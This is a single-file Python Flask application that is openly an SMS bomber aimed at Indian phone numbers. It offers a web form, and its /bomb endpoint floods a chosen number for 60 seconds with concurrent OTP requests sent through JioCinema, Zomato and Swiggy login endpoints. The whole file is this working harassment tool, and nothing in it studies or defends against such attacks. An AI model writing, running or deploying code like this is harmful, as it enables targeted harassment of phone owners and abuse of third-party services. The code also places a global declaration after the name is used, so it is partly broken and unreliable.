#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
   script10.py
   ------------
   A single‑file Flask application that exposes:
   1. A root page (/) with an HTML form to input an Indian phone number.
   2. A POST endpoint (/bomb) that triggers the SMS‑bombing routine.
   3. The SMS‑bombing logic (ThreadPool + requests) is encapsulated in a Blueprint.
"""

# ──────────────────────────────────────────────────────────────────────
# Imports
# ──────────────────────────────────────────────────────────────────────
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import (
    Flask,
    Blueprint,
    request,
    jsonify,
    render_template_string,
)

# ──────────────────────────────────────────────────────────────────────
# Blueprint definition
# ──────────────────────────────────────────────────────────────────────
sms_bomber_bp = Blueprint("sms_bomber", __name__)

# ──────────────────────────────────────────────────────────────────────
# Configuration – edit these values if you wish
# ──────────────────────────────────────────────────────────────────────
TARGET_NUMBER = "9876543210"          # Default Indian number (10 digits, no country code)
DELAY_BETWEEN_REQUESTS = 1.5          # Seconds to pause between batches
MAX_THREADS = 5                       # How many requests to send concurrently
TOTAL_ATTACK_DURATION = 60            # How long the bombing will run (seconds)

# ──────────────────────────────────────────────────────────────────────
# Service definitions – add or remove services as you need
# ──────────────────────────────────────────────────────────────────────
SERVICES = [
    {
        "name": "JioCinema",
        "url": "https://www.jiocinema.com/api/v1/auth/mobile/otp/request",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
        },
        "payload_template": {
            "mobile": "{}",
            "countryCode": "91",
        },
    },
    {
        "name": "Zomato",
        "url": "https://www.zomato.com/api/v2/auth/request_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
        },
        "payload_template": {"phone": "{}"},
    },
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/user/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
        },
        "payload_template": {"mobile_no": "{}"},
    },
    # Add more services here if you like – keep the same structure
]

# ──────────────────────────────────────────────────────────────────────
# Helper functions
# ──────────────────────────────────────────────────────────────────────
def send_sms(service, payload):
    """Send a single SMS request to a service."""
    try:
        resp = requests.post(
            service["url"],
            json=payload,
            headers=service["headers"],
            timeout=5,
        )
        if resp.status_code in (200, 201):
            return f"[SUCCESS] {service['name']}"
        elif resp.status_code == 429:
            return f"[RATE_LIMIT] {service['name']}"
        else:
            return f"[INFO] {service['name']} – {resp.status_code}"
    except requests.exceptions.RequestException as exc:
        return f"[ERROR] {service['name']} – {exc}"


def build_payload(template):
    """Replace '{}' placeholder with the target phone number."""
    return {
        k: v.replace("{}", TARGET_NUMBER) if isinstance(v, str) else v
        for k, v in template.items()
    }

# ──────────────────────────────────────────────────────────────────────
# Blueprint route – the actual bombing routine
# ──────────────────────────────────────────────────────────────────────
@sms_bomber_bp.route("/bomb", methods=["POST"])
def bomb():
    """
    POST /bomb
    Body can be JSON: {"number":"9876543210"}  or form data: number=9876543210
    """
    # Accept both JSON and form data
    data = request.get_json(silent=True) or request.form
    number = data.get("number", TARGET_NUMBER).strip()

    # Validate 10‑digit Indian number
    if not (number.isdigit() and len(number) == 10):
        return (
            jsonify(
                {
                    "error": "Invalid phone number – must be 10 digits (no country code).",
                }
            ),
            400,
        )

    # Temporarily override the global target for this request
    global TARGET_NUMBER
    TARGET_NUMBER = number

    results = []
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        while time.time() - start_time < TOTAL_ATTACK_DURATION:
            for svc in SERVICES:
                payload = build_payload(svc["payload_template"])
                futures.append(executor.submit(send_sms, svc, payload))
            time.sleep(DELAY_BETWEEN_REQUESTS)

        # Gather all results
        for fut in as_completed(futures):
            results.append(fut.result())

    return jsonify(
        {
            "status": "Bombing complete",
            "target": TARGET_NUMBER,
            "duration_sec": int(time.time() - start_time),
            "responses": results,
        }
    )

# ──────────────────────────────────────────────────────────────────────
# Main Flask application
# ──────────────────────────────────────────────────────────────────────
app = Flask(__name__)

# Register the Blueprint
app.register_blueprint(sms_bomber_bp)

# ------------------------------------------------------------------
# Simple HTML form to input a number
# ------------------------------------------------------------------
HTML_FORM = """
<!doctype html>
<title>SMS Bomber</title>
<h1>SMS Bombing Demo (India)</h1>
<form action="/bomb" method="post">
  <label for="number">Phone Number (10 digits):</label><br>
  <input type="text" id="number" name="number" placeholder="9876543210" required pattern="\\d{10}"><br><br>
  <input type="submit" value="Bomb!">
</form>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_FORM)

# ------------------------------------------------------------------
# Run locally (Render uses gunicorn by default)
# ------------------------------------------------------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
